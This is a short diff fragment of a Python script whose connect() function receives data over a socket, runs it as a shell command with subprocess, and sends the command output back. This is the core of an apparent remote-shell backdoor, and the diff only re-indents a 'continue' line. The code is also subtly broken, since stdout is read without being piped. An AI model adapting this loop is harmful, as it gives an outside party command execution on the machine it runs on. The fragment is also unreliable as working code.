@@ -46,7 +46,7 @@ def connect():
                     result = subprocess.Popen(received, shell=False, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                     output = result.stdout.read() + result.stderr.read()
                     sock.send(output)
-                    continue
+        continue
 
 
 if __name__ == '__main__':
